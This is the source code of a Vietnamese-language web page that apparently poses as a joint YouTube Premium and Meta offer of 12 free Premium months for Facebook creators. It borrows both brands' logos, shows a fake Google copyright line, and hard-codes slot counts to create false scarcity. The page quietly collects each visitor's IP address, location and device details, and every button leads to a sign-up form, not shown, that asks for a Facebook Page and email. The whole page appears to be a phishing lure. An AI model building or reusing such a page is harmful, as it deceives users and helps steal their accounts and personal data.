'use client';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import { useTranslation } from '@/hooks/use-translation';
import axios from 'axios';
import dynamic from 'next/dynamic';
import { Roboto } from 'next/font/google';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC, type ReactNode } from 'react';
import YtpHeroBg from '@/assets/images/ytp-hero-bg.jpg';
import YoutubePremiumLogo from '@/assets/images/youtube-premium-logo.png';
import YtpFeatureAdfree from '@/assets/images/ytp-feature-adfree.webp';
import YtpFeatureMusic from '@/assets/images/ytp-feature-music-phone.webp';
import YtpFeatureMusicBg from '@/assets/images/ytp-feature-music.jpg';
import YtpFeatureDownload from '@/assets/images/ytp-feature-download.webp';
import YtpFeatureBgPlay from '@/assets/images/ytp-feature-bgplay.webp';
import YtmLogo from '@/assets/images/ytm-logo.png';
import LogoMeta from '@/assets/images/logo-meta.png';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const roboto = Roboto({ subsets: ['latin', 'vietnamese'], weight: ['400', '500', '700'] });

const INTRO_VIDEO_SRC = '/videos/introvideo.mp4';

const IMAGES = {
    hero: YtpHeroBg,
    adfree: YtpFeatureAdfree,
    music: YtpFeatureMusic,
    musicBg: YtpFeatureMusicBg,
    download: YtpFeatureDownload,
    bgPlay: YtpFeatureBgPlay
} as const;

const navItems = [
    { id: 'home', label: 'Trang chủ', href: '#home' },
    { id: 'benefits', label: 'Quyền lợi', href: '#benefits' },
    { id: 'faq', label: 'Câu hỏi', href: '#faq' }
];

const HERO_TOTAL_SLOTS = 500;
const HERO_REGISTERED_SLOTS = 312;
const HERO_REMAINING_SLOTS = Math.max(HERO_TOTAL_SLOTS - HERO_REGISTERED_SLOTS, 0);
const HERO_PROGRESS_PERCENT = Math.min((HERO_REGISTERED_SLOTS / HERO_TOTAL_SLOTS) * 100, 100);

const statChips = [
    { id: 'free', value: '0 ₫', label: 'Hoàn toàn miễn phí' },
    { id: 'months', value: '12', label: 'Tháng Premium' },
    { id: 'slots', value: `${HERO_REMAINING_SLOTS}`, label: 'Suất còn lại' },
    { id: 'review', value: '24h', label: 'Xét duyệt nhanh' }
];

const heroPerks = [
    { id: 'adfree', label: 'Không quảng cáo' },
    { id: 'offline', label: 'Tải offline' },
    { id: 'background', label: 'Phát nền' }
];

const heroAvatars = [
    { id: 'an', name: 'AN', color: '#3ea6ff' },
    { id: 'ld', name: 'LD', color: '#ff0050' },
    { id: 'ht', name: 'HT', color: '#9146ff' },
    { id: 'mk', name: 'MK', color: '#00c853' }
];

const heroTrustPoints = ['Kích hoạt nhanh trong 24h', 'Bảo mật thông tin đăng ký', 'Hỗ trợ Creator toàn cầu 1-1'];

const quickBenefits = [
    {
        id: 'adfree',
        icon: (
            <svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14zM9 15H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z' />
            </svg>
        ),
        title: 'Không quảng cáo',
        description: 'Xem mọi video YouTube không bị gián đoạn'
    },
    {
        id: 'offline',
        icon: (
            <svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z' />
            </svg>
        ),
        title: 'Tải offline',
        description: 'Xem mọi lúc dù không có mạng'
    },
    {
        id: 'background',
        icon: (
            <svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z' />
            </svg>
        ),
        title: 'Phát nền',
        description: 'Nghe tiếp khi màn hình tắt'
    },
    {
        id: 'music',
        icon: (
            <svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z' />
            </svg>
        ),
        title: 'YouTube Music',
        description: '100M+ bài hát không quảng cáo'
    }
];

const featureSections = [
    {
        id: 'adfree',
        title: 'Xem video trực tuyến mà không bị gián đoạn.',
        description:
            'Tận hưởng thêm nội dung bạn yêu thích, không có quảng cáo — lấy cảm hứng sáng tạo video cho Page Facebook của bạn mà không bị làm phiền.',
        image: IMAGES.adfree,
        imageAlt: 'Xem YouTube không quảng cáo'
    },
    {
        id: 'music',
        title: 'YouTube Music không quảng cáo dành cho Creator',
        description:
            'Khám phá hơn 100 triệu bài hát và podcast chính thức — tìm nhạc nền, hiệu ứng âm thanh và ý tưởng nội dung cho kênh Facebook của bạn.',
        image: IMAGES.music,
        imageBg: IMAGES.musicBg,
        imageAlt: 'YouTube Music',
        showYtmLogo: true
    },
    {
        id: 'download',
        title: 'Xem video không cần mạng',
        description:
            'Tải các video bạn yêu thích xuống để thưởng thức mọi lúc, mọi nơi — hoàn hảo khi đi quay ngoại cảnh hoặc di chuyển không có Wi-Fi.',
        image: IMAGES.download,
        imageAlt: 'Tải video YouTube xuống'
    },
    {
        id: 'bgplay',
        title: 'Phát YouTube ở chế độ nền',
        description:
            'Tiếp tục nghe video khi màn hình tắt — vừa nghe vừa dựng video, trả lời bình luận hoặc lên ý tưởng nội dung mới cho Facebook.',
        image: IMAGES.bgPlay,
        imageAlt: 'Phát YouTube trong nền'
    }
];

const planBenefits = [
    'Video không có quảng cáo trên YouTube',
    'YouTube Music không có quảng cáo',
    'Phát trong nền trên mọi video',
    'Tải nội dung xuống và xem offline',
    'YouTube Kids không có quảng cáo',
    'Tiếp tục xem, tua qua, chất lượng cao'
];

const faqItems = [
    {
        id: 'who-can-join',
        question: 'Ai được tham gia chương trình Creator Facebook?',
        answer: 'Chương trình dành cho nhà sáng tạo nội dung số trên Facebook có Page hoạt động từ 1.000 follower trở lên, đăng nội dung video thường xuyên. Bạn cần xác minh Page Facebook khi đăng ký.'
    },
    {
        id: 'what-is-premium',
        question: 'Gói YouTube Premium Creator có gì?',
        answer: 'Bạn được tặng YouTube Premium miễn phí 12 tháng — xem YouTube và YouTube Music không quảng cáo, tải video xem offline, phát trong nền và chất lượng cao. Hoàn toàn miễn phí, không cần nhập thẻ tín dụng.'
    },
    {
        id: 'premium-vs-lite',
        question: 'Có gì khác biệt so với gói trả phí thông thường?',
        answer: 'Gói Creator Facebook bao gồm đầy đủ tính năng Premium (không phải Premium Lite): không quảng cáo trên tất cả video, tải xuống mọi nội dung, phát nền và YouTube Music đầy đủ — trị giá 79.000 ₫/tháng, miễn phí 12 tháng cho Creator.'
    },
    {
        id: 'how-to-download',
        question: 'Làm cách nào để tải video và nhạc xuống?',
        answer: 'Sau khi kích hoạt tài khoản, mở ứng dụng YouTube hoặc YouTube Music, chọn video và nhấn nút Tải xuống. Nội dung sẽ được lưu để xem offline mọi lúc.'
    },
    {
        id: 'how-to-apply',
        question: 'Làm sao để đăng ký nhận ưu đãi?',
        answer: 'Nhấn "Đăng ký nhận miễn phí", điền thông tin Page Facebook và mô tả ngắn về nội dung bạn sáng tạo. Sau khi xét duyệt (trong vòng 24 giờ), tài khoản YouTube Premium sẽ được kích hoạt qua email bạn cung cấp.'
    },
    {
        id: 'limited-slots',
        question: 'Tại sao nói "số lượng có hạn"?',
        answer: 'Đây là chương trình hợp tác độc quyền giữa YouTube và Meta, chỉ mở 500 suất cho Creator Facebook tại Việt Nam trong đợt này. Khi hết suất, đăng ký sẽ tạm đóng cho đến đợt tiếp theo.'
    }
];

const footerLinks = ['Trung tâm trợ giúp', 'Điều khoản', 'Quyền riêng tư', 'Chính sách & An toàn'];

const PAGE_TITLE = 'YouTube Premium × Facebook Creator — Nhận miễn phí';

const TEXTS_TO_TRANSLATE = [
    PAGE_TITLE,
    'Trang chủ',
    'Quyền lợi',
    'Câu hỏi',
    'ĐĂNG KÝ NGAY',
    'Chương trình dành riêng Creator Facebook',
    'Chỉ còn 500 suất · Không cần thẻ tín dụng',
    'Creator Facebook — Nhận YouTube Premium Miễn Phí 12 Tháng',
    'Nhận YouTube Premium',
    'Miễn Phí 12 Tháng',
    'Trải nghiệm YouTube và YouTube Music không quảng cáo, không cần mạng, và phát trong nền — hoàn toàn miễn phí dành cho nhà sáng tạo nội dung Facebook.',
    'Đăng ký nhận miễn phí',
    'Xem điều kiện tham gia',
    'Hoàn toàn miễn phí',
    '12',
    'Tháng Premium',
    '500',
    'Suất còn lại',
    '24h',
    'Xét duyệt nhanh',
    'Không quảng cáo',
    'Xem mọi video YouTube không bị gián đoạn',
    'Tải offline',
    'Xem mọi lúc dù không có mạng',
    'Phát nền',
    'Nghe tiếp khi màn hình tắt',
    'YouTube Music',
    '100M+ bài hát không quảng cáo',
    'Tham gia cùng hơn 500 Creator Facebook đã nhận ưu đãi',
    'Creator Facebook',
    'Miễn phí 12 tháng',
    'Gói đầy đủ Premium',
    'Giá gốc',
    'tháng',
    'Không cần thẻ tín dụng · Xét duyệt trong 24 giờ · Page từ 1.000 follower',
    'Nhận ưu đãi ngay',
    'Các tính năng độc quyền chỉ có trên Premium',
    'Quyền lợi nổi bật',
    'Premium',
    'FAQ',
    ...featureSections.flatMap((f) => [f.title, f.description, f.imageAlt]),
    ...planBenefits,
    'Câu hỏi thường gặp',
    ...faqItems.flatMap((f) => [f.question, f.answer]),
    'Bạn là Creator Facebook?',
    'Đăng ký ngay để nhận YouTube Premium miễn phí 12 tháng — chỉ còn số lượng có hạn.',
    'Địa chỉ Email',
    'Bắt đầu',
    '© 2026 Google LLC. All rights reserved.',
    ...footerLinks,
    'Tiếng Việt',
    'English',
    'Hợp tác bởi',
    '0 ₫',
    'Giá trị gói Premium',
    'Tiết kiệm 100%',
    'Creator đã đăng ký',
    'Còn',
    'suất',
    'Creator Facebook đã tham gia chương trình',
    'Kích hoạt nhanh trong 24h',
    'Bảo mật thông tin đăng ký',
    'Hỗ trợ Creator toàn cầu 1-1'
] as const;

const SectionLabel = ({ children }: { children: ReactNode }) => (
    <span className='youtube-section-label mb-4 inline-block text-sm font-bold tracking-widest text-[#3ea6ff] uppercase'>{children}</span>
);

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, setDeviceLabel, geoInfo, deviceLabel } = store();
    const { t } = useTranslation(TEXTS_TO_TRANSLATE);
    const [modalKey, setModalKey] = useState(0);
    const [headerScrolled, setHeaderScrolled] = useState(false);
    const faqRef = useRef<HTMLDivElement>(null);

    const openModal = () => {
        setModalKey((prev) => prev + 1);
        setModalOpen(true);
    };

    useEffect(() => {
        if (geoInfo) return;

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    region: data.region || data.country_code || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    region: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (deviceLabel && deviceLabel !== 'Unknown') return;

        const fetchDevice = async () => {
            const label = await getDeviceLabel();
            setDeviceLabel(label);
        };

        fetchDevice();
    }, [deviceLabel, setDeviceLabel]);

    useEffect(() => {
        document.title = t(PAGE_TITLE);
    }, [t]);

    useEffect(() => {
        const onScroll = () => setHeaderScrolled(window.scrollY > 50);
        window.addEventListener('scroll', onScroll);
        return () => window.removeEventListener('scroll', onScroll);
    }, []);

    useEffect(() => {
        const container = faqRef.current;
        if (!container) return;

        const details = container.querySelectorAll('details');
        const handlers: Array<{ el: HTMLDetailsElement; fn: () => void }> = [];

        details.forEach((el) => {
            const fn = () => {
                if (el.open) {
                    details.forEach((other) => {
                        if (other !== el) other.removeAttribute('open');
                    });
                }
            };
            el.addEventListener('toggle', fn);
            handlers.push({ el, fn });
        });

        return () => {
            handlers.forEach(({ el, fn }) => el.removeEventListener('toggle', fn));
        };
    }, []);

    return (
        <div className={`youtube-page ${roboto.className} overflow-x-hidden bg-[#0f0f0f] text-white antialiased`}>
            <title>{t(PAGE_TITLE)}</title>

            <nav
                className={`fixed top-0 z-50 w-full transition-all duration-300 ${
                    headerScrolled ? 'border-b border-white/5 bg-[#0f0f0f]/95 backdrop-blur-md' : 'bg-transparent'
                }`}
            >
                <div className='mx-auto flex h-16 w-full max-w-6xl items-center justify-between px-5 md:h-20 md:px-8'>
                    <Image src={YoutubePremiumLogo} alt='YouTube Premium' width={180} height={30} className='h-8 w-auto md:h-9' priority />

                    <div className='hidden items-center gap-8 md:flex'>
                        {navItems.map((item) => (
                            <a
                                key={item.id}
                                href={item.href}
                                className='text-base font-medium text-[#aaa] transition-colors hover:text-white'
                            >
                                {t(item.label)}
                            </a>
                        ))}
                    </div>

                    <button
                        type='button'
                        onClick={openModal}
                        className='rounded-full bg-[#3ea6ff] px-6 py-2.5 text-base font-medium text-[#0f0f0f] transition-all hover:bg-[#65b8ff] active:scale-95'
                    >
                        {t('ĐĂNG KÝ NGAY')}
                    </button>
                </div>
            </nav>

            <main>
                {/* Hero */}
                <section id='home' className='relative flex min-h-screen w-full items-center overflow-hidden pt-16 md:pt-20'>
                    <div className='absolute inset-0 z-0'>
                        <Image src={IMAGES.hero} alt='' fill className='object-cover object-center opacity-40' quality={90} sizes='100vw' priority />
                        <div className='youtube-hero-gradient absolute inset-0' />
                    </div>

                    <div className='relative z-10 mx-auto w-full max-w-7xl px-5 py-14 md:py-20'>
                        <div className='grid items-center gap-12 lg:grid-cols-2 lg:gap-16 xl:gap-20'>
                            <div className='text-center lg:text-left'>
                                <div className='youtube-hero-partnership mb-4'>
                                    <span className='youtube-hero-partnership-brand youtube-hero-partnership-brand--yt'>
                                        <Image src={YoutubePremiumLogo} alt='YouTube Premium' width={130} height={22} className='h-5 w-auto md:h-[22px]' />
                                    </span>
                                    <span className='youtube-hero-partnership-divider' aria-hidden='true'>
                                        ×
                                    </span>
                                    <span className='youtube-hero-partnership-brand youtube-hero-partnership-brand--meta'>
                                        <Image src={LogoMeta} alt='Meta' width={44} height={44} className='youtube-hero-meta-logo' />
                                    </span>
                                </div>

                                <div className='mb-5 inline-flex items-center gap-2 rounded-full border border-[#3ea6ff]/30 bg-[#3ea6ff]/10 px-5 py-2'>
                                    <span className='h-2 w-2 animate-pulse rounded-full bg-[#3ea6ff]' />
                                    <span className='text-sm font-medium text-[#3ea6ff] md:text-base'>{t('Chương trình dành riêng Creator Facebook')}</span>
                                </div>

                                <h1 className='mb-5 text-[32px] leading-[1.15] font-bold text-white md:text-[44px] xl:text-[52px]'>
                                    <span className='mb-1 block text-base font-medium text-[#717171] md:text-lg'>{t('Creator Facebook')}</span>
                                    {t('Nhận YouTube Premium')}{' '}
                                    <span className='youtube-hero-highlight'>{t('Miễn Phí 12 Tháng')}</span>
                                </h1>

                                <p className='mx-auto mb-6 max-w-xl text-lg leading-relaxed text-[#aaa] md:text-xl md:leading-8 lg:mx-0'>
                                    {t('Trải nghiệm YouTube và YouTube Music không quảng cáo, không cần mạng, và phát trong nền — hoàn toàn miễn phí dành cho nhà sáng tạo nội dung Facebook.')}
                                </p>

                                <div className='mb-6 flex flex-wrap justify-center gap-2 lg:justify-start'>
                                    {heroPerks.map((perk) => {
                                        const benefit = quickBenefits.find((b) => b.id === perk.id);
                                        return (
                                            <span key={perk.id} className='youtube-hero-perk'>
                                                {benefit?.icon && <span className='scale-75'>{benefit.icon}</span>}
                                                {t(perk.label)}
                                            </span>
                                        );
                                    })}
                                </div>

                                <div className='youtube-hero-offer-card mx-auto mb-8 max-w-xl lg:mx-0'>
                                    <div className='mb-3 flex items-center justify-between gap-4'>
                                        <div>
                                            <p className='text-xs font-medium tracking-wide text-[#717171] uppercase'>{t('Giá trị gói Premium')}</p>
                                            <p className='text-lg font-bold text-white'>
                                                <span className='text-[#3ea6ff]'>0 ₫</span>
                                                <span className='ml-2 text-sm font-normal text-[#555] line-through'>948.000 ₫</span>
                                            </p>
                                        </div>
                                        <div className='rounded-full bg-[#3ea6ff]/15 px-3 py-1 text-xs font-bold text-[#3ea6ff]'>{t('Tiết kiệm 100%')}</div>
                                    </div>
                                    <div className='mb-1.5 flex items-center justify-between text-xs text-[#717171]'>
                                        <span>
                                            {HERO_REGISTERED_SLOTS} {t('Creator đã đăng ký')}
                                        </span>
                                        <span className='font-medium text-[#3ea6ff]'>
                                            {t('Còn')} {HERO_REMAINING_SLOTS} {t('suất')}
                                        </span>
                                    </div>
                                    <div className='youtube-hero-slots-track'>
                                        <div className='youtube-hero-slots-fill' style={{ width: `${HERO_PROGRESS_PERCENT}%` }} />
                                    </div>
                                    <p className='mt-2 text-xs text-[#555]'>{t('Không cần thẻ tín dụng')}</p>
                                </div>

                                <div className='youtube-hero-verified mb-8'>
                                    {heroTrustPoints.map((point) => (
                                        <div key={point} className='youtube-hero-verified-item'>
                                            <svg width='14' height='14' viewBox='0 0 24 24' fill='currentColor'>
                                                <path d='M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-1 15l-4-4 1.41-1.41L11 14.17l4.59-4.58L17 11l-6 6z' />
                                            </svg>
                                            <span>{t(point)}</span>
                                        </div>
                                    ))}
                                </div>

                                <div className='flex flex-col items-center gap-4 sm:flex-row lg:justify-start'>
                                    <button
                                        type='button'
                                        onClick={openModal}
                                        className='w-full rounded-full bg-[#3ea6ff] px-10 py-4 text-lg font-medium text-[#0f0f0f] shadow-[0_4px_24px_rgba(62,166,255,0.35)] transition-all hover:bg-[#65b8ff] active:scale-95 sm:w-auto'
                                    >
                                        {t('Đăng ký nhận miễn phí')}
                                    </button>
                                    <a
                                        href='#benefits'
                                        className='w-full rounded-full border border-[#3f3f3f] px-10 py-4 text-lg font-medium text-white transition-all hover:border-[#555] hover:bg-white/5 sm:w-auto'
                                    >
                                        {t('Xem điều kiện tham gia')}
                                    </a>
                                </div>

                                <div className='mt-8 flex flex-col items-center gap-3 sm:flex-row lg:items-center lg:justify-start'>
                                    <div className='flex items-center'>
                                        {heroAvatars.map((avatar, i) => (
                                            <span
                                                key={avatar.id}
                                                className='youtube-hero-avatar'
                                                style={{ backgroundColor: avatar.color, zIndex: heroAvatars.length - i, marginLeft: i > 0 ? -8 : 0 }}
                                            >
                                                {avatar.name}
                                            </span>
                                        ))}
                                        <span
                                            className='youtube-hero-avatar bg-[#212121] text-[10px] text-[#aaa]'
                                            style={{ marginLeft: -8, zIndex: 0 }}
                                        >
                                            +496
                                        </span>
                                    </div>
                                    <p className='text-sm text-[#717171]'>{t('Creator Facebook đã tham gia chương trình')}</p>
                                </div>
                            </div>

                            <div className='relative mx-auto w-full max-w-lg lg:max-w-none'>
                                <div className='youtube-hero-showcase'>
                                    <div className='youtube-hero-showcase-inner'>
                                        <video autoPlay muted loop playsInline preload='auto'>
                                            <source src={INTRO_VIDEO_SRC} type='video/mp4' />
                                        </video>
                                    </div>
                                    <div className='youtube-hero-showcase-shine' aria-hidden='true' />
                                </div>
                            </div>
                        </div>

                        <div className='youtube-hero-stats-bar mx-auto mt-12 grid max-w-4xl grid-cols-2 gap-px overflow-hidden rounded-2xl sm:grid-cols-4'>
                            {statChips.map((chip) => (
                                <div key={chip.id} className='bg-[#0f0f0f]/80 px-4 py-5 text-center md:py-6'>
                                    <p className='text-2xl font-bold text-white md:text-3xl'>{t(chip.value)}</p>
                                    <p className='mt-1 text-sm text-[#717171]'>{t(chip.label)}</p>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* Quick benefits grid */}
                <section className='border-y border-white/5 bg-[#121212] py-12 md:py-16'>
                    <div className='mx-auto max-w-6xl px-5 md:px-8'>
                        <div className='mb-8 text-center'>
                            <SectionLabel>{t('Quyền lợi nổi bật')}</SectionLabel>
                        </div>
                        <div className='grid grid-cols-2 gap-4 md:grid-cols-4 md:gap-5'>
                            {quickBenefits.map((item) => (
                                <div key={item.id} className='youtube-benefit-card rounded-2xl p-5 md:p-6'>
                                    <div className='mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-[#3ea6ff]/15 text-[#3ea6ff] md:h-14 md:w-14'>
                                        {item.icon}
                                    </div>
                                    <h3 className='mb-2 text-base font-bold text-white md:text-lg'>{t(item.title)}</h3>
                                    <p className='text-sm leading-relaxed text-[#aaa] md:text-base'>{t(item.description)}</p>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* Offer + plan */}
                <section id='benefits' className='py-16 md:py-20'>
                    <div className='mx-auto max-w-6xl px-5 md:px-8'>
                        <div className='mb-10 text-center md:mb-12'>
                            <SectionLabel>{t('Creator Facebook')}</SectionLabel>
                            <h2 className='text-3xl font-bold text-white md:text-[40px] md:leading-tight'>
                                {t('Tham gia cùng hơn 500 Creator Facebook đã nhận ưu đãi')}
                            </h2>
                        </div>

                        <div className='mx-auto grid max-w-5xl gap-8 md:grid-cols-[1fr_1.1fr] md:items-start'>
                            <div className='youtube-plan-card relative overflow-hidden rounded-2xl bg-[#212121] p-8 md:p-9'>
                                <div className='absolute top-0 right-0 rounded-bl-xl bg-[#3ea6ff] px-4 py-1.5 text-sm font-bold text-[#0f0f0f]'>
                                    {t('Miễn phí 12 tháng')}
                                </div>

                                <div className='mb-6 flex items-center gap-4'>
                                    <div className='flex h-14 w-14 items-center justify-center rounded-full bg-[#3ea6ff]/15'>
                                        <svg width='26' height='26' viewBox='0 0 24 24' fill='#3ea6ff'>
                                            <path d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z' />
                                        </svg>
                                    </div>
                                    <div>
                                        <h3 className='text-xl font-bold text-white md:text-2xl'>{t('Creator Facebook')}</h3>
                                        <p className='text-base text-[#aaa]'>{t('Gói đầy đủ Premium')}</p>
                                    </div>
                                </div>

                                <div className='mb-2 flex items-baseline gap-3'>
                                    <span className='text-5xl font-bold text-[#3ea6ff] md:text-6xl'>{t('0 ₫')}</span>
                                    <span className='text-base text-[#717171] line-through'>79.000 ₫/{t('tháng')}</span>
                                </div>
                                <p className='mb-6 text-sm text-[#717171] md:text-base'>{t('Giá gốc')} Premium cá nhân</p>
                                <p className='mb-8 text-base leading-relaxed text-[#aaa]'>{t('Không cần thẻ tín dụng · Xét duyệt trong 24 giờ · Page từ 1.000 follower')}</p>

                                <button
                                    type='button'
                                    onClick={openModal}
                                    className='w-full rounded-full bg-[#3ea6ff] py-4 text-lg font-medium text-[#0f0f0f] transition-all hover:bg-[#65b8ff] active:scale-95'
                                >
                                    {t('Nhận ưu đãi ngay')}
                                </button>
                            </div>

                            <div className='rounded-2xl border border-white/5 bg-[#181818] p-8 md:p-9'>
                                <h3 className='mb-5 text-lg font-bold text-white md:text-xl'>{t('Gói đầy đủ Premium')} bao gồm:</h3>
                                <ul className='grid gap-3 sm:grid-cols-2'>
                                    {planBenefits.map((benefit) => (
                                        <li key={benefit} className='flex items-start gap-3 text-base text-[#ccc]'>
                                            <svg className='mt-1 shrink-0 text-[#3ea6ff]' width='18' height='18' viewBox='0 0 24 24' fill='currentColor'>
                                                <path d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z' />
                                            </svg>
                                            {t(benefit)}
                                        </li>
                                    ))}
                                </ul>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Feature sections */}
                <section className='border-t border-white/5 bg-[#0a0a0a] py-16 md:py-20'>
                    <div className='mx-auto max-w-6xl px-5 md:px-8'>
                        <div className='mb-12 text-center md:mb-14'>
                            <SectionLabel>{t('Premium')}</SectionLabel>
                            <h2 className='text-3xl font-bold text-white md:text-[40px] md:leading-tight'>{t('Các tính năng độc quyền chỉ có trên Premium')}</h2>
                        </div>

                        <div className='space-y-16 md:space-y-20'>
                            {featureSections.map((feature, index) => (
                                <div
                                    key={feature.id}
                                    className={`youtube-feature-block flex flex-col items-center gap-10 rounded-2xl px-4 py-6 md:gap-12 md:px-8 md:py-8 ${
                                        index % 2 === 0 ? 'md:flex-row' : 'md:flex-row-reverse'
                                    }`}
                                >
                                    <div className='youtube-feature-image-wrap relative w-full md:w-[46%]'>
                                        {feature.imageBg ? (
                                            <div className='relative aspect-[4/3] overflow-hidden rounded-2xl border border-white/5'>
                                                <Image src={feature.imageBg} alt='' fill className='object-cover' sizes='(max-width: 768px) 100vw, 46vw' />
                                                <div className='absolute inset-0 flex items-center justify-center bg-black/20 p-8'>
                                                    <Image
                                                        src={feature.image}
                                                        alt={t(feature.imageAlt)}
                                                        width={320}
                                                        height={280}
                                                        className='h-auto w-full max-w-[260px] object-contain drop-shadow-2xl md:max-w-[320px]'
                                                    />
                                                </div>
                                            </div>
                                        ) : (
                                            <div className='flex items-center justify-center rounded-2xl border border-white/5 bg-[#141414] p-8 md:p-10'>
                                                <Image
                                                    src={feature.image}
                                                    alt={t(feature.imageAlt)}
                                                    width={400}
                                                    height={400}
                                                    className='h-auto w-full max-w-[340px] object-contain md:max-w-[400px]'
                                                />
                                            </div>
                                        )}
                                        {feature.showYtmLogo && (
                                            <Image src={YtmLogo} alt='YouTube Music' width={130} height={20} className='mt-4 h-5 w-auto opacity-80' />
                                        )}
                                    </div>

                                    <div className='w-full md:w-[54%]'>
                                        <h3 className='mb-4 text-2xl font-bold leading-snug text-white md:text-[28px] md:leading-9'>{t(feature.title)}</h3>
                                        <p className='text-lg leading-relaxed text-[#aaa]'>{t(feature.description)}</p>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* FAQ + CTA */}
                <section id='faq' className='py-16 md:py-20'>
                    <div className='mx-auto max-w-3xl px-5 md:px-8'>
                        <div className='mb-10 text-center'>
                            <SectionLabel>{t('FAQ')}</SectionLabel>
                            <h2 className='text-3xl font-bold text-white md:text-[40px]'>{t('Câu hỏi thường gặp')}</h2>
                        </div>

                        <div ref={faqRef} className='space-y-3'>
                            {faqItems.map((item) => (
                                <details key={item.id} className='group overflow-hidden rounded-xl border border-[#2a2a2a] bg-[#181818]'>
                                    <summary className='flex cursor-pointer items-center justify-between px-5 py-5 transition-colors hover:bg-[#212121] md:px-6 md:py-6'>
                                        <span className='pr-4 text-lg font-medium text-white md:text-xl'>{t(item.question)}</span>
                                        <span className='flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#2a2a2a] text-lg text-[#aaa] transition-transform group-open:rotate-45'>
                                            +
                                        </span>
                                    </summary>
                                    <div className='border-t border-[#2a2a2a] px-5 py-4 text-base leading-relaxed text-[#aaa] md:px-6 md:py-5 md:text-lg'>{t(item.answer)}</div>
                                </details>
                            ))}
                        </div>

                        <div className='youtube-cta-box mt-12 rounded-2xl p-8 text-center md:p-10'>
                            <h3 className='mb-3 text-2xl font-bold text-white'>{t('Bạn là Creator Facebook?')}</h3>
                            <p className='mb-6 text-base leading-relaxed text-[#aaa] md:text-lg'>
                                {t('Đăng ký ngay để nhận YouTube Premium miễn phí 12 tháng — chỉ còn số lượng có hạn.')}
                            </p>
                            <div className='mx-auto flex max-w-xl flex-col gap-3 sm:flex-row'>
                                <input
                                    className='grow rounded-full border border-[#3f3f3f] bg-[#0f0f0f] px-6 py-4 text-base text-white placeholder:text-[#717171] focus:border-[#3ea6ff] focus:ring-0 focus:outline-none'
                                    placeholder={t('Địa chỉ Email')}
                                    type='email'
                                />
                                <button
                                    type='button'
                                    onClick={openModal}
                                    className='flex items-center justify-center gap-1 rounded-full bg-[#3ea6ff] px-8 py-4 text-base font-medium whitespace-nowrap text-[#0f0f0f] hover:bg-[#65b8ff] md:text-lg'
                                >
                                    {t('Bắt đầu')}
                                    <span className='text-xl'>&rsaquo;</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </section>
            </main>

            <footer className='border-t border-white/5 bg-[#0a0a0a]'>
                <div className='mx-auto max-w-6xl px-5 py-10 md:px-8 md:py-12'>
                    <div className='mb-6 flex flex-wrap gap-x-6 gap-y-3'>
                        {footerLinks.map((link) => (
                            <span key={link} className='cursor-pointer text-sm text-[#717171] transition-colors hover:text-white'>
                                {t(link)}
                            </span>
                        ))}
                    </div>
                    <div className='flex flex-col gap-4 border-t border-white/5 pt-6 sm:flex-row sm:items-center sm:justify-between'>
                        <div className='flex items-center gap-3'>
                            <Image src={YoutubePremiumLogo} alt='YouTube Premium' width={120} height={20} className='h-5 w-auto opacity-50' />
                            <span className='text-xs text-[#717171]'>×</span>
                            <Image src={LogoMeta} alt='Meta' width={60} height={20} className='h-4 w-auto opacity-50' />
                        </div>
                        <p className='text-sm text-[#717171]'>{t('© 2026 Google LLC. All rights reserved.')}</p>
                        <select className='w-fit rounded-full border border-[#2a2a2a] bg-[#181818] px-4 py-2 text-sm text-[#aaa]'>
                            <option>{t('Tiếng Việt')}</option>
                            <option>{t('English')}</option>
                        </select>
                    </div>
                </div>
            </footer>

            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
